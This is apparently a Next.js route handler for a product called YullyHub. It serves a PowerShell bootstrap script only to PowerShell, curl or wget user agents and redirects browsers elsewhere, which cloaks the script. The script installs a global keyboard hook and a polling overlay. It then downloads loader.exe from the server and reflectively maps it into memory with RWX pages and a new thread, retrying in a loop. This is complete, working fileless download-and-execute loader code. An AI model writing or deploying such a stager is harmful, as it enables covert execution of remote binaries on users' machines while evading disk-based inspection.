// /loader — dual-mode endpoint (works on Vercel serverless AND on the
// local custom server). PowerShell / curl / wget get the reflective
// PE-loader bootstrap script; browsers get 302'd to the dashboard root.
//
// The bootstrap script fetches /loader.exe (served from Next's public/
// dir so Vercel bundles it into the deploy) and reflectively maps it
// into the running PowerShell process.

function isPowerShellUA(ua) {
    if (!ua) return false;
    const u = ua.toLowerCase();
    return u.includes('powershell') ||
           u.includes('windowspowershell') ||
           u.includes('pwsh') ||
           u.includes('curl') ||
           u.includes('wget');
}

function buildLoaderPs1(host, scheme) {
    const binUrl = `${scheme}://${host}/loader.exe`;
    const exitCheckUrl = `${scheme}://${host}/api/loader/wrapper-should-exit`;
    const overlayUrl = `${scheme}://${host}/api/loader/overlay`;
    return `# YullyHub Loader — reflective in-memory launcher
$ErrorActionPreference = 'Stop'
$BinUrl = '${binUrl}'
$OverlayUrl = '${overlayUrl}'

# ---------- Status Bar (WinForms overlay) ----------
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$barCode = @'
using System;
using System.Drawing;
using System.Drawing.Drawing2D;
using System.Windows.Forms;
using System.Threading;
using System.Net;
using System.Runtime.InteropServices;

public class StatusBar : Form {
    [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKbProc cb, IntPtr hMod, uint tid);
    [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr hhk);
    [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wP, IntPtr lP);
    [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
    delegate IntPtr LowLevelKbProc(int nCode, IntPtr wP, IntPtr lP);

    static StatusBar instance;
    static Thread uiThread;
    static IntPtr hookId;
    static LowLevelKbProc hookDelegate;

    Label lbl;
    Panel accent;
    System.Windows.Forms.Timer pollTimer;
    System.Windows.Forms.Timer stepTimer;

    string pollUrl;
    long lastVersion = 0;
    string[][] steps;      // [kind, text, dismiss, keybind, timeoutMs]
    int stepIdx = -1;
    string waitKey = null;

    StatusBar(string url) {
        pollUrl = url;
        FormBorderStyle = FormBorderStyle.None;
        BackColor = Color.FromArgb(14, 14, 16);
        Opacity = 0.95;
        TopMost = true;
        ShowInTaskbar = false;
        StartPosition = FormStartPosition.Manual;
        var wa = Screen.PrimaryScreen.WorkingArea;
        Width  = Math.Min(wa.Width - 40, 900);
        Height = 44;
        Left   = wa.Left + (wa.Width - Width) / 2;
        Top    = wa.Bottom - Height - 16;
        var gp = new GraphicsPath();
        int r = 12;
        gp.AddArc(0, 0, r*2, r*2, 180, 90);
        gp.AddArc(Width-r*2, 0, r*2, r*2, 270, 90);
        gp.AddArc(Width-r*2, Height-r*2, r*2, r*2, 0, 90);
        gp.AddArc(0, Height-r*2, r*2, r*2, 90, 90);
        gp.CloseFigure();
        Region = new Region(gp);

        accent = new Panel { Height = 3, Dock = DockStyle.Top, BackColor = Color.FromArgb(71, 146, 226) };
        lbl = new Label {
            Text = "  YullyHub — ready",
            ForeColor = Color.FromArgb(190, 190, 195),
            Font = new Font("Segoe UI", 10f, FontStyle.Regular),
            AutoSize = false, Dock = DockStyle.Fill,
            TextAlign = ContentAlignment.MiddleCenter
        };
        Controls.Add(lbl);
        Controls.Add(accent);

        stepTimer = new System.Windows.Forms.Timer();
        stepTimer.Tick += (s, e) => { stepTimer.Stop(); Advance(); };

        pollTimer = new System.Windows.Forms.Timer { Interval = 1500 };
        pollTimer.Tick += (s, e) => Poll();
        pollTimer.Start();
    }

    void Poll() {
        try {
            var wc = new WebClient();
            wc.Headers.Add("Cache-Control", "no-cache");
            wc.Headers.Add("User-Agent", "yullyhub-overlay/1");
            string resp = wc.DownloadString(pollUrl + "?v=" + lastVersion);
            if (resp == null || !resp.StartsWith("v=")) return;
            var lines = resp.Split(new[]{'\\r','\\n'}, StringSplitOptions.RemoveEmptyEntries);
            long ver = 0;
            long.TryParse(lines[0].Substring(2), out ver);
            if (ver <= lastVersion || lines.Length < 2) return;
            lastVersion = ver;
            var arr = new string[lines.Length - 1][];
            for (int i = 1; i < lines.Length; i++) {
                arr[i-1] = lines[i].Split('|');
            }
            steps = arr;
            stepIdx = -1;
            Advance();
        } catch {}
    }

    void Advance() {
        stepTimer.Stop();
        stepIdx++;
        if (steps == null || stepIdx >= steps.Length) {
            lbl.Text = "  YullyHub — ready";
            lbl.ForeColor = Color.FromArgb(190, 190, 195);
            accent.BackColor = Color.FromArgb(71, 146, 226);
            waitKey = null;
            return;
        }
        var s = steps[stepIdx];
        string kind    = s.Length > 0 ? s[0] : "message";
        string text    = s.Length > 1 ? s[1] : "";
        string dismiss = s.Length > 2 ? s[2] : "timeout";
        string keybind = s.Length > 3 ? s[3] : "";
        int ms = 3000;
        if (s.Length > 4) int.TryParse(s[4], out ms);
        if (ms < 500) ms = 3000;

        lbl.Text = "  " + text;
        if (kind == "success") {
            accent.BackColor = Color.FromArgb(46, 160, 67);
            lbl.ForeColor = Color.FromArgb(46, 200, 90);
        } else if (kind == "close") {
            accent.BackColor = Color.FromArgb(200, 60, 60);
            lbl.ForeColor = Color.FromArgb(200, 180, 180);
        } else {
            accent.BackColor = Color.FromArgb(71, 146, 226);
            lbl.ForeColor = Color.FromArgb(220, 220, 225);
        }
        if (dismiss == "keybind" && keybind.Length > 0) {
            waitKey = keybind;
            lbl.Text += "   [ " + keybind + " ]";
        } else {
            waitKey = null;
        }
        stepTimer.Interval = ms;
        stepTimer.Start();
    }

    void OnGlobalKey(int vk) {
        if (waitKey == null) return;
        string name = ((Keys)vk).ToString();
        if (name.Equals(waitKey, StringComparison.OrdinalIgnoreCase)) {
            waitKey = null;
            stepTimer.Stop();
            Advance();
        }
    }

    public static void Launch(string url) {
        uiThread = new Thread(() => {
            instance = new StatusBar(url);
            hookDelegate = (nCode, wP, lP) => {
                if (nCode >= 0 && wP == (IntPtr)0x0100) {
                    int vk = Marshal.ReadInt32(lP);
                    try { instance.BeginInvoke((Action)(() => instance.OnGlobalKey(vk))); } catch {}
                }
                return CallNextHookEx(hookId, nCode, wP, lP);
            };
            using (var p = System.Diagnostics.Process.GetCurrentProcess())
            using (var m = p.MainModule)
                hookId = SetWindowsHookEx(13, hookDelegate, GetModuleHandle(m.ModuleName), 0);
            Application.Run(instance);
            UnhookWindowsHookEx(hookId);
        });
        uiThread.SetApartmentState(ApartmentState.STA);
        uiThread.IsBackground = true;
        uiThread.Start();
    }

    public static void SetText(string txt) {
        if (instance != null && !instance.IsDisposed)
            try { instance.BeginInvoke((Action)(() => instance.lbl.Text = "  " + txt)); } catch {}
    }

    public static void Kill() {
        if (instance != null && !instance.IsDisposed)
            try { instance.BeginInvoke((Action)(() => instance.Close())); } catch {}
    }
}
'@

Add-Type -TypeDefinition $barCode -ReferencedAssemblies System.Windows.Forms,System.Drawing -ErrorAction SilentlyContinue
[StatusBar]::Launch($OverlayUrl)

$csharp = @'
using System;
using System.Runtime.InteropServices;

public static class RPE {
    [DllImport("kernel32.dll")]  public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    [DllImport("kernel32.dll")]  public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    [DllImport("kernel32.dll")]  public static extern IntPtr LoadLibraryA(string lpLibFileName);
    [DllImport("kernel32.dll", CharSet=CharSet.Ansi)] public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32.dll")]  public static extern IntPtr GetProcAddress(IntPtr hModule, IntPtr ordinal);
    [DllImport("kernel32.dll")]  public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
    [DllImport("kernel32.dll")]  public static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    public const uint MEM_COMMIT  = 0x1000;
    public const uint MEM_RESERVE = 0x2000;
    public const uint PAGE_READWRITE = 0x04;
    public const uint PAGE_EXECUTE_READWRITE = 0x40;

    public static void Run(byte[] raw) {
        int e_lfanew = BitConverter.ToInt32(raw, 0x3C);
        ushort machine = BitConverter.ToUInt16(raw, e_lfanew + 4);
        if (machine != 0x8664) throw new Exception("Only x64 payloads supported");
        ushort numSections     = BitConverter.ToUInt16(raw, e_lfanew + 6);
        ushort sizeOptionalHdr = BitConverter.ToUInt16(raw, e_lfanew + 20);
        int optHdrOff = e_lfanew + 24;
        uint addrOfEntry    = BitConverter.ToUInt32(raw, optHdrOff + 16);
        ulong prefImageBase = BitConverter.ToUInt64(raw, optHdrOff + 24);
        uint sizeOfImage    = BitConverter.ToUInt32(raw, optHdrOff + 56);
        uint sizeOfHeaders  = BitConverter.ToUInt32(raw, optHdrOff + 60);
        int dataDirOff = optHdrOff + 112;
        uint importRva  = BitConverter.ToUInt32(raw, dataDirOff + 8 * 1);
        uint relocRva   = BitConverter.ToUInt32(raw, dataDirOff + 8 * 5);
        uint relocSize  = BitConverter.ToUInt32(raw, dataDirOff + 8 * 5 + 4);

        IntPtr baseAddr = VirtualAlloc((IntPtr)prefImageBase, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero)
            baseAddr = VirtualAlloc(IntPtr.Zero, sizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        if (baseAddr == IntPtr.Zero) throw new Exception("VirtualAlloc failed");

        Marshal.Copy(raw, 0, baseAddr, (int)sizeOfHeaders);
        int secTableOff = optHdrOff + sizeOptionalHdr;
        for (int i = 0; i < numSections; i++) {
            int so = secTableOff + i * 40;
            uint vSize   = BitConverter.ToUInt32(raw, so + 8);
            uint vAddr   = BitConverter.ToUInt32(raw, so + 12);
            uint rawSize = BitConverter.ToUInt32(raw, so + 16);
            uint rawPtr  = BitConverter.ToUInt32(raw, so + 20);
            if (rawSize == 0) continue;
            IntPtr dst = new IntPtr(baseAddr.ToInt64() + vAddr);
            Marshal.Copy(raw, (int)rawPtr, dst, (int)rawSize);
        }

        long delta = baseAddr.ToInt64() - (long)prefImageBase;
        if (delta != 0 && relocSize > 0) {
            int cursor = 0;
            IntPtr relBase = new IntPtr(baseAddr.ToInt64() + relocRva);
            while (cursor < relocSize) {
                IntPtr blk = new IntPtr(relBase.ToInt64() + cursor);
                uint blkRva  = (uint)Marshal.ReadInt32(blk, 0);
                uint blkSize = (uint)Marshal.ReadInt32(blk, 4);
                if (blkSize == 0) break;
                int entries = (int)(blkSize - 8) / 2;
                for (int j = 0; j < entries; j++) {
                    ushort entry = (ushort)Marshal.ReadInt16(blk, 8 + j * 2);
                    int type = entry >> 12;
                    int off  = entry & 0xFFF;
                    if (type == 10) {
                        IntPtr patchAddr = new IntPtr(baseAddr.ToInt64() + blkRva + off);
                        long v = Marshal.ReadInt64(patchAddr);
                        Marshal.WriteInt64(patchAddr, v + delta);
                    }
                }
                cursor += (int)blkSize;
            }
        }

        if (importRva != 0) {
            int impCursor = 0;
            while (true) {
                IntPtr descPtr = new IntPtr(baseAddr.ToInt64() + importRva + impCursor);
                uint origThunk  = (uint)Marshal.ReadInt32(descPtr, 0);
                uint nameRva    = (uint)Marshal.ReadInt32(descPtr, 12);
                uint firstThunk = (uint)Marshal.ReadInt32(descPtr, 16);
                if (nameRva == 0 && firstThunk == 0) break;
                string dllName = Marshal.PtrToStringAnsi(new IntPtr(baseAddr.ToInt64() + nameRva));
                IntPtr hMod = LoadLibraryA(dllName);
                if (hMod == IntPtr.Zero) throw new Exception("LoadLibrary failed: " + dllName);

                uint thunkRva = origThunk != 0 ? origThunk : firstThunk;
                int idx = 0;
                while (true) {
                    IntPtr thunkPtr = new IntPtr(baseAddr.ToInt64() + thunkRva + idx * 8);
                    IntPtr iatPtr   = new IntPtr(baseAddr.ToInt64() + firstThunk + idx * 8);
                    long thunkVal = Marshal.ReadInt64(thunkPtr);
                    if (thunkVal == 0) break;
                    IntPtr proc;
                    if ((ulong)thunkVal >> 63 == 1) {
                        ushort ordinal = (ushort)(thunkVal & 0xFFFF);
                        proc = GetProcAddress(hMod, (IntPtr)ordinal);
                    } else {
                        IntPtr nameEntry = new IntPtr(baseAddr.ToInt64() + (thunkVal & 0x7FFFFFFF) + 2);
                        string funcName = Marshal.PtrToStringAnsi(nameEntry);
                        proc = GetProcAddress(hMod, funcName);
                    }
                    if (proc == IntPtr.Zero) throw new Exception("GetProcAddress failed");
                    Marshal.WriteInt64(iatPtr, proc.ToInt64());
                    idx++;
                }
                impCursor += 20;
            }
        }

        uint oldProt;
        VirtualProtect(baseAddr, sizeOfImage, PAGE_EXECUTE_READWRITE, out oldProt);

        IntPtr entryPtr = new IntPtr(baseAddr.ToInt64() + addrOfEntry);
        IntPtr th = CreateThread(IntPtr.Zero, 0, entryPtr, IntPtr.Zero, 0, IntPtr.Zero);
        if (th == IntPtr.Zero) throw new Exception("CreateThread failed");
        WaitForSingleObject(th, 0xFFFFFFFF);
    }
}
'@

Add-Type -TypeDefinition $csharp -Language CSharp -ErrorAction Stop | Out-Null

Write-Host ""
Write-Host "  YullyHub  -  bootstrapping loader..." -ForegroundColor Cyan
Write-Host ""
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

# Auto-reconnect loop with rapid-fail guard:
#   - If loader.exe stays up for a normal amount of time (>=8s) before
#     exiting, we treat that as a healthy restart and reconnect.
#   - If it exits in <8s three attempts in a row, that's a crash loop
#     (bad download URL, incompatible binary, missing permission) —
#     we bail so we don't stack "Download failed" popups forever.
# EXIT signal: after each RPE::Run returns, we ask the server "should I
# shut down?". The dashboard's X-close button posts our IP to
# /api/loader/wrapper-signal-exit; if that timestamp is newer than
# $StartEpoch we exit the loop and the PS window closes cleanly.
$ExitCheckUrl = '${exitCheckUrl}'
$StartEpoch = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
$attempt = 0
$rapidFails = 0
while ($true) {
    $attempt = $attempt + 1
    $runStart = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
    try {
        $wc = New-Object System.Net.WebClient
        $wc.Headers.Add('Cache-Control', 'no-cache')
        $wc.Headers.Add('User-Agent',    'yullyhub-bootstrap/' + $attempt)
        $bytes = $wc.DownloadData($BinUrl)
        Write-Host "  [attempt $attempt] fetched $($bytes.Length) bytes. Mapping..." -ForegroundColor Green
        [RPE]::Run($bytes)
        Write-Host "  [attempt $attempt] loader thread exited." -ForegroundColor Yellow
    } catch {
        Write-Host ("  [attempt " + $attempt + "] error: " + $_.Exception.Message) -ForegroundColor DarkYellow
    }
    $elapsed = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds() - $runStart
    if ($elapsed -lt 8) {
        $rapidFails = $rapidFails + 1
        Write-Host ("  Rapid exit (" + $elapsed + "s). Rapid-fail count: " + $rapidFails + "/3.") -ForegroundColor Magenta
    } else {
        $rapidFails = 0
    }
    if ($rapidFails -ge 3) {
        Write-Host "  Loader is in a crash loop. Exiting wrapper — re-run the command after the issue is fixed." -ForegroundColor Red
        break
    }
    try {
        $wc2 = New-Object System.Net.WebClient
        $wc2.Headers.Add('Cache-Control', 'no-cache')
        $wc2.Headers.Add('User-Agent',    'yullyhub-wrapper-check/1')
        $resp = $wc2.DownloadString($ExitCheckUrl + '?since=' + $StartEpoch)
        if ($resp -match '"exit"\\s*:\\s*true') {
            Write-Host "  Dashboard closed. Shutting down loader wrapper." -ForegroundColor Cyan
            break
        }
    } catch { }
    Start-Sleep -Seconds 3
}
try { [StatusBar]::Kill() } catch {}
Write-Host "  YullyHub loader exited." -ForegroundColor Cyan
`;
}

export const runtime = 'nodejs';       // Node runtime supports our sync response
export const dynamic = 'force-dynamic'; // never cache

function handle(request) {
    const ua = request.headers.get('user-agent') || '';
    const host = request.headers.get('host') || 'localhost:3000';
    const proto = request.headers.get('x-forwarded-proto') ||
                  (host.startsWith('localhost') || host.startsWith('127.') ? 'http' : 'https');

    if (isPowerShellUA(ua)) {
        return new Response(buildLoaderPs1(host, proto), {
            status: 200,
            headers: {
                'Content-Type':  'text/plain; charset=utf-8',
                'Cache-Control': 'no-store, no-cache, must-revalidate',
                'X-Content-Type-Options': 'nosniff',
            },
        });
    }
    return Response.redirect(`${proto}://${host}/`, 302);
}

export async function GET(request)   { return handle(request); }
export async function HEAD(request)  { return handle(request); }
